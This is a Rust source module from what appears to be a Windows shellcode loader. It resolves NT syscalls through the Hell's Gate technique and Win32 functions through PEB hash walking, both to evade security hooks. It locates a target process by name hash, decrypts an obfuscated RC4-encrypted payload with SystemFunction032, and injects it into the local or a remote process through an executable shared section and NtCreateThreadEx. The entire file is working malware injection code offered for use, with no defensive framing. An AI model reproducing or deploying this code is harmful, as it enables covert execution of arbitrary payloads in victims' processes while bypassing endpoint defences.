#![allow(static_mut_refs)]
//! Injection engine — syscall table initialization + RC4 decrypt + mapping injection.
//!
//! Exports:
//!   - `G_SYS`  — global VxTable filled by `initialize_syscalls()`
//!   - `G_API`  — global ApiHashing filled by `initialize_syscalls()`
//!   - `initialize_syscalls()`      — resolve all NT syscalls + Win32 API pointers
//!   - `get_remote_process_handle()` — find a process by wide name, return (pid, handle)
//!   - `rc4_decrypt_payload()`       — recover obfuscated RC4 key, decrypt payload in-place
//!   - `remote_mapping_injection()`  — map-and-execute via NT section/thread syscalls

#![allow(non_snake_case, dead_code, unused_unsafe)]

use crate::types::*;

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

pub static mut G_SYS: VxTable    = VxTable::zeroed();
pub static mut G_API: ApiHashing = ApiHashing::zeroed();

// ---------------------------------------------------------------------------
// Kernel32 heap helpers (extern, provided by the Windows loader)
// ---------------------------------------------------------------------------

extern "system" {
    fn GetProcessHeap() -> HANDLE;
    fn HeapAlloc(heap: HANDLE, flags: u32, bytes: usize) -> *mut u8;
    fn HeapFree(heap: HANDLE, flags: u32, mem: *mut u8) -> i32;
    fn LoadLibraryA(name: *const u8) -> *mut u8;
}

// ---------------------------------------------------------------------------
// Local do_syscall! macro
// ---------------------------------------------------------------------------

/// Arm `HellsGate` with the SSN from `$entry` and call `HellDescent`
/// cast to `$ftype` with the remaining arguments.
macro_rules! do_syscall {
    ($entry:expr, $ftype:ty $(, $arg:expr)* $(,)?) => {
        unsafe {
            crate::syscall::HellsGate(($entry).ssn);
            let f: $ftype = core::mem::transmute(crate::syscall::HellDescent as *const ());
            f($($arg),*)
        }
    };
}

// ---------------------------------------------------------------------------
// initialize_syscalls
// ---------------------------------------------------------------------------

/// Resolve all NT syscall stubs (via HellsGate PE walk) and all Win32 API
/// function pointers (via PEB hash walk).  Must be called once before any
/// other function in this module.
///
/// Returns `true` on success, `false` if any lookup fails.
pub fn initialize_syscalls() -> bool {
    unsafe {
        // ── Locate ntdll base ───────────────────────────────────────────
        let h_ntdll = crate::peb::get_module_handle_h(HASH_NTDLL);
        if h_ntdll.is_null() {
            return false;
        }

        // ── Get ntdll export directory ──────────────────────────────────
        let export_dir = match crate::hellsgate::get_image_export_directory(h_ntdll) {
            Some(p) => p,
            None    => return false,
        };

        // ── Resolve VxTable entries (SSN for each NT syscall) ───────────
        // Hashes are pre-initialized in VxTable::zeroed() via VxEntry::new(hash).
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_query_system_information) { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_create_section)           { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_map_view_of_section)      { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_unmap_view_of_section)    { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_close)                    { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_create_thread_ex)         { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_wait_for_single_object)   { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_delay_execution)          { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_create_file)              { return false; }
        if !crate::hellsgate::get_vx_entry(h_ntdll, export_dir, &mut G_SYS.nt_protect_virtual_memory)   { return false; }

        // ── Resolve Kernel32 / User32 Win32 API pointers ────────────────
        let h_kernel32 = crate::peb::get_module_handle_h(HASH_KERNEL32);
        let h_user32   = crate::peb::get_module_handle_h(HASH_USER32);
        if h_kernel32.is_null() || h_user32.is_null() {
            return false;
        }

        macro_rules! resolve {
            ($module:expr, $hash:expr) => {
                crate::peb::get_proc_address_h($module, $hash)
            };
        }

        // Kernel32 entries
        {
            let p = resolve!(h_kernel32, HASH_GET_TICK_COUNT64);
            if p.is_null() { return false; }
            G_API.get_tick_count64 = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_kernel32, HASH_OPEN_PROCESS);
            if p.is_null() { return false; }
            G_API.open_process = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_kernel32, HASH_CLOSE_HANDLE);
            if p.is_null() { return false; }
            G_API.close_handle = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_kernel32, HASH_GET_MODULE_FILE_NAME_W);
            if p.is_null() { return false; }
            G_API.get_module_file_name_w = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_kernel32, HASH_CREATE_FILE_W);
            if p.is_null() { return false; }
            G_API.create_file_w = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_kernel32, HASH_SET_FILE_INFORMATION_BY_HANDLE);
            if p.is_null() { return false; }
            G_API.set_file_information_by_handle = Some(core::mem::transmute(p));
        }

        // User32 entries
        {
            let p = resolve!(h_user32, HASH_CALL_NEXT_HOOK_EX);
            if p.is_null() { return false; }
            G_API.call_next_hook_ex = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_user32, HASH_SET_WINDOWS_HOOK_EX_W);
            if p.is_null() { return false; }
            G_API.set_windows_hook_ex_w = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_user32, HASH_GET_MESSAGE_W);
            if p.is_null() { return false; }
            G_API.get_message_w = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_user32, HASH_DEF_WINDOW_PROC_W);
            if p.is_null() { return false; }
            G_API.def_window_proc_w = Some(core::mem::transmute(p));
        }
        {
            let p = resolve!(h_user32, HASH_UNHOOK_WINDOWS_HOOK_EX);
            if p.is_null() { return false; }
            G_API.unhook_windows_hook_ex = Some(core::mem::transmute(p));
        }

        // Early-bird optional entries (only resolved when the feature is active)
        #[cfg(feature = "early_bird")]
        {
            {
                let p = resolve!(h_kernel32, HASH_VIRTUAL_ALLOC_EX);
                if p.is_null() { return false; }
                G_API.virtual_alloc_ex = Some(core::mem::transmute(p));
            }
            {
                let p = resolve!(h_kernel32, HASH_VIRTUAL_PROTECT_EX);
                if p.is_null() { return false; }
                G_API.virtual_protect_ex = Some(core::mem::transmute(p));
            }
            {
                let p = resolve!(h_kernel32, HASH_WRITE_PROCESS_MEMORY);
                if p.is_null() { return false; }
                G_API.write_process_memory = Some(core::mem::transmute(p));
            }
            {
                let p = resolve!(h_kernel32, HASH_QUEUE_USER_APC);
                if p.is_null() { return false; }
                G_API.queue_user_apc = Some(core::mem::transmute(p));
            }
            {
                let p = resolve!(h_kernel32, HASH_CREATE_PROCESS_W);
                if p.is_null() { return false; }
                G_API.create_process_w = Some(core::mem::transmute(p));
            }
            {
                let p = resolve!(h_kernel32, HASH_DEBUG_ACTIVE_PROCESS_STOP);
                if p.is_null() { return false; }
                G_API.debug_active_process_stop = Some(core::mem::transmute(p));
            }
            {
                let p = resolve!(h_kernel32, HASH_RESUME_THREAD);
                if p.is_null() { return false; }
                G_API.resume_thread = Some(core::mem::transmute(p));
            }
        }

        true
    }
}

// ---------------------------------------------------------------------------
// get_remote_process_handle
// ---------------------------------------------------------------------------

/// Walk the system process list via `NtQuerySystemInformation` and find the
/// process whose image name hashes to the same value as `name` (wide, compared
/// after uppercasing).
///
/// On success returns `Some((pid, process_handle))` with `PROCESS_ALL_ACCESS`.
/// Returns `None` if the process is not found or any allocation/syscall fails.
pub fn get_remote_process_handle(name: &[u16]) -> Option<(u32, HANDLE)> {
    unsafe {
        // ── First call: obtain the required buffer size ─────────────────
        let mut return_len1: u32 = 0;
        let status1: NTSTATUS = do_syscall!(
            G_SYS.nt_query_system_information,
            unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> NTSTATUS,
            SYSTEM_PROCESS_INFORMATION,
            core::ptr::null_mut(),
            0u32,
            &mut return_len1,
        );

        if status1 != STATUS_INFO_LENGTH_MISMATCH {
            return None;
        }

        // ── Allocate heap buffer ────────────────────────────────────────
        let heap = GetProcessHeap();
        let buf = HeapAlloc(heap, HEAP_ZERO_MEMORY, return_len1 as usize);
        if buf.is_null() {
            return None;
        }

        // ── Second call: fill the buffer ────────────────────────────────
        let mut return_len2: u32 = 0;
        let status2: NTSTATUS = do_syscall!(
            G_SYS.nt_query_system_information,
            unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> NTSTATUS,
            SYSTEM_PROCESS_INFORMATION,
            buf,
            return_len1,
            &mut return_len2,
        );

        if status2 < 0 {
            HeapFree(heap, 0, buf);
            return None;
        }

        // ── Compute hash of the target name once ────────────────────────
        let target_hash = crate::hashing::joaat_w_upper_slice(name);

        // ── Walk the process list ────────────────────────────────────────
        let mut result: Option<(u32, HANDLE)> = None;
        let mut ptr = buf as *mut SystemProcessInformation;

        loop {
            let image_name = &(*ptr).image_name;

            if image_name.length != 0 && !image_name.buffer.is_null() {
                let char_count = (image_name.length / 2) as usize;
                let name_slice = core::slice::from_raw_parts(image_name.buffer, char_count);
                let proc_hash  = crate::hashing::joaat_w_upper_slice(name_slice);

                if proc_hash == target_hash {
                    let pid = (*ptr).unique_process_id as usize as u32;
                    let open_process = G_API.open_process.expect("open_process not resolved");
                    let hprocess = open_process(PROCESS_ALL_ACCESS, 0 /*FALSE*/, pid);
                    if !hprocess.is_null() {
                        result = Some((pid, hprocess));
                    }
                    break;
                }
            }

            if (*ptr).next_entry_offset == 0 {
                break;
            }
            ptr = (ptr as usize + (*ptr).next_entry_offset as usize) as *mut SystemProcessInformation;
        }

        HeapFree(heap, 0, buf);
        result
    }
}

// ---------------------------------------------------------------------------
// rc4_decrypt_payload
// ---------------------------------------------------------------------------

/// Recover the real RC4 key from the obfuscated `enc_key` slice and decrypt
/// `payload` in-place using `SystemFunction032` from Cryptsp.dll.
///
/// Obfuscation scheme (matches the builder):
///   `enc_key[i] = (real_key[i] + i) ^ xor_byte`
///
/// `hint_byte` is the expected plain value of `real_key[0]`, used to brute-
/// force `xor_byte` in 256 iterations.
///
/// Returns `true` on success.
pub fn rc4_decrypt_payload(payload: &mut [u8], enc_key: &[u8], hint_byte: u8) -> bool {
    if enc_key.is_empty() || payload.is_empty() {
        return false;
    }

    // ── Brute-force xor_byte such that (enc_key[0] ^ xor_byte) - 0 == hint_byte
    let mut xor_byte: u8 = 0;
    let mut found = false;
    for i in 0u32..256 {
        let candidate = (enc_key[0] ^ (i as u8)).wrapping_sub(0);
        if candidate == hint_byte {
            xor_byte = i as u8;
            found = true;
            break;
        }
    }
    if !found {
        return false;
    }

    // ── Recover real key ─────────────────────────────────────────────────
    let key_size = enc_key.len();
    let mut real_key = [0u8; 256]; // 256-byte stack buffer — enough for any RC4 key
    if key_size > real_key.len() {
        return false;
    }
    for i in 0..key_size {
        real_key[i] = (enc_key[i] ^ xor_byte).wrapping_sub(i as u8);
    }

    // ── Load SystemFunction032 from Cryptsp.dll ──────────────────────────
    unsafe {
        let cryptsp = LoadLibraryA(b"Cryptsp\0".as_ptr());
        if cryptsp.is_null() {
            return false;
        }

        let sf032_ptr = crate::peb::get_proc_address_h(cryptsp, HASH_SYSTEM_FUNCTION032);
        if sf032_ptr.is_null() {
            return false;
        }

        type SysFunc032 = unsafe extern "system" fn(*mut Ustring, *mut Ustring) -> NTSTATUS;
        let sf032: SysFunc032 = core::mem::transmute(sf032_ptr);

        // ── Build USTRING descriptors ─────────────────────────────────────
        let mut u_key = Ustring {
            length:         key_size as u32,
            maximum_length: key_size as u32,
            buffer:         real_key.as_mut_ptr(),
        };
        let mut u_payload = Ustring {
            length:         payload.len() as u32,
            maximum_length: payload.len() as u32,
            buffer:         payload.as_mut_ptr(),
        };

        // NT_SUCCESS: status >= 0
        sf032(&mut u_payload, &mut u_key) >= 0
    }
}

// ---------------------------------------------------------------------------
// remote_mapping_injection
// ---------------------------------------------------------------------------

/// Inject `payload` into `process` (or the current process when `local` is
/// `true`) via a shared section + `NtCreateThreadEx`.
///
/// Steps:
///   1. `NtCreateSection`      — create a shared RWX section
///   2. `NtMapViewOfSection`   — map RW locally, copy payload bytes
///   3a. If `local`:  create thread in current process against local view
///   3b. If `!local`: map RX into remote, create thread there
///   4. `NtWaitForSingleObject` — wait for thread completion
///   5. Unmap views, close handles
///
/// Returns `true` on success.
pub fn remote_mapping_injection(process: HANDLE, payload: &mut [u8], local: bool) -> bool {
    unsafe {
        let payload_size = payload.len();
        let mut section_size: LARGE_INTEGER = payload_size as LARGE_INTEGER;

        // ── 1. NtCreateSection ───────────────────────────────────────────
        let mut h_section: HANDLE = core::ptr::null_mut();
        let status: NTSTATUS = do_syscall!(
            G_SYS.nt_create_section,
            unsafe extern "system" fn(
                *mut HANDLE,   // SectionHandle
                u32,           // DesiredAccess
                *mut u8,       // ObjectAttributes (NULL)
                *mut LARGE_INTEGER, // MaximumSize
                u32,           // SectionPageProtection
                u32,           // AllocationAttributes
                HANDLE,        // FileHandle (NULL)
            ) -> NTSTATUS,
            &mut h_section,
            SECTION_ALL_ACCESS,
            core::ptr::null_mut::<u8>(),
            &mut section_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            core::ptr::null_mut::<core::ffi::c_void>(),
        );
        if status < 0 {
            return false;
        }

        // ── 2. NtMapViewOfSection — local RW ────────────────────────────
        let mut local_view: PVOID = core::ptr::null_mut();
        let mut view_size: usize  = 0usize;
        let current_process = !0usize as HANDLE; // NtCurrentProcess() pseudo-handle

        let status: NTSTATUS = do_syscall!(
            G_SYS.nt_map_view_of_section,
            unsafe extern "system" fn(
                HANDLE,         // SectionHandle
                HANDLE,         // ProcessHandle
                *mut PVOID,     // BaseAddress (in/out)
                usize,          // ZeroBits
                usize,          // CommitSize
                *mut i64,       // SectionOffset (NULL)
                *mut usize,     // ViewSize (in/out)
                u32,            // InheritDisposition (ViewShare = 1)
                u32,            // AllocationType
                u32,            // Win32Protect
            ) -> NTSTATUS,
            h_section,
            current_process,
            &mut local_view,
            0usize,
            0usize,
            core::ptr::null_mut::<i64>(),
            &mut view_size,
            VIEW_SHARE,
            0u32,
            PAGE_READWRITE,
        );
        if status < 0 {
            do_syscall!(
                G_SYS.nt_close,
                unsafe extern "system" fn(HANDLE) -> NTSTATUS,
                h_section,
            );
            return false;
        }

        // ── Copy payload into local view ─────────────────────────────────
        let dst = local_view as *mut u8;
        for i in 0..payload_size {
            *dst.add(i) = payload[i];
        }

        // ── 3a. Local injection ──────────────────────────────────────────
        if local {
            let mut h_thread: HANDLE = core::ptr::null_mut();
            let status: NTSTATUS = do_syscall!(
                G_SYS.nt_create_thread_ex,
                unsafe extern "system" fn(
                    *mut HANDLE, // ThreadHandle
                    u32,         // DesiredAccess
                    *mut u8,     // ObjectAttributes (NULL)
                    HANDLE,      // ProcessHandle
                    *mut u8,     // StartRoutine
                    PVOID,       // Argument (NULL)
                    u32,         // CreateFlags (0 = run immediately)
                    usize,       // ZeroBits
                    usize,       // StackSize
                    usize,       // MaximumStackSize
                    PVOID,       // AttributeList (NULL)
                ) -> NTSTATUS,
                &mut h_thread,
                THREAD_ALL_ACCESS,
                core::ptr::null_mut::<u8>(),
                current_process,
                local_view as *mut u8,
                core::ptr::null_mut::<core::ffi::c_void>(),
                0u32,
                0usize,
                0usize,
                0usize,
                core::ptr::null_mut::<core::ffi::c_void>(),
            );
            if status < 0 {
                do_syscall!(
                    G_SYS.nt_unmap_view_of_section,
                    unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS,
                    current_process,
                    local_view,
                );
                do_syscall!(
                    G_SYS.nt_close,
                    unsafe extern "system" fn(HANDLE) -> NTSTATUS,
                    h_section,
                );
                return false;
            }

            do_syscall!(
                G_SYS.nt_wait_for_single_object,
                unsafe extern "system" fn(HANDLE, i32, *mut i64) -> NTSTATUS,
                h_thread,
                0i32, // Alertable = FALSE
                core::ptr::null_mut::<i64>(), // Timeout = NULL (infinite)
            );
            do_syscall!(
                G_SYS.nt_close,
                unsafe extern "system" fn(HANDLE) -> NTSTATUS,
                h_thread,
            );

        // ── 3b. Remote injection ─────────────────────────────────────────
        } else {
            let mut remote_view: PVOID = core::ptr::null_mut();
            let mut remote_view_size: usize = 0usize;

            let status: NTSTATUS = do_syscall!(
                G_SYS.nt_map_view_of_section,
                unsafe extern "system" fn(
                    HANDLE,
                    HANDLE,
                    *mut PVOID,
                    usize,
                    usize,
                    *mut i64,
                    *mut usize,
                    u32,
                    u32,
                    u32,
                ) -> NTSTATUS,
                h_section,
                process,
                &mut remote_view,
                0usize,
                0usize,
                core::ptr::null_mut::<i64>(),
                &mut remote_view_size,
                VIEW_SHARE,
                0u32,
                PAGE_EXECUTE_READ,
            );
            if status < 0 {
                do_syscall!(
                    G_SYS.nt_unmap_view_of_section,
                    unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS,
                    current_process,
                    local_view,
                );
                do_syscall!(
                    G_SYS.nt_close,
                    unsafe extern "system" fn(HANDLE) -> NTSTATUS,
                    h_section,
                );
                return false;
            }

            let mut h_thread: HANDLE = core::ptr::null_mut();
            let status: NTSTATUS = do_syscall!(
                G_SYS.nt_create_thread_ex,
                unsafe extern "system" fn(
                    *mut HANDLE,
                    u32,
                    *mut u8,
                    HANDLE,
                    *mut u8,
                    PVOID,
                    u32,
                    usize,
                    usize,
                    usize,
                    PVOID,
                ) -> NTSTATUS,
                &mut h_thread,
                THREAD_ALL_ACCESS,
                core::ptr::null_mut::<u8>(),
                process,
                remote_view as *mut u8,
                core::ptr::null_mut::<core::ffi::c_void>(),
                0u32,
                0usize,
                0usize,
                0usize,
                core::ptr::null_mut::<core::ffi::c_void>(),
            );
            if status < 0 {
                do_syscall!(
                    G_SYS.nt_unmap_view_of_section,
                    unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS,
                    process,
                    remote_view,
                );
                do_syscall!(
                    G_SYS.nt_unmap_view_of_section,
                    unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS,
                    current_process,
                    local_view,
                );
                do_syscall!(
                    G_SYS.nt_close,
                    unsafe extern "system" fn(HANDLE) -> NTSTATUS,
                    h_section,
                );
                return false;
            }

            do_syscall!(
                G_SYS.nt_wait_for_single_object,
                unsafe extern "system" fn(HANDLE, i32, *mut i64) -> NTSTATUS,
                h_thread,
                0i32,
                core::ptr::null_mut::<i64>(),
            );
            do_syscall!(
                G_SYS.nt_close,
                unsafe extern "system" fn(HANDLE) -> NTSTATUS,
                h_thread,
            );
            do_syscall!(
                G_SYS.nt_unmap_view_of_section,
                unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS,
                process,
                remote_view,
            );
        }

        // ── Cleanup: unmap local view + close section ────────────────────
        do_syscall!(
            G_SYS.nt_unmap_view_of_section,
            unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS,
            current_process,
            local_view,
        );
        do_syscall!(
            G_SYS.nt_close,
            unsafe extern "system" fn(HANDLE) -> NTSTATUS,
            h_section,
        );

        true
    }
}
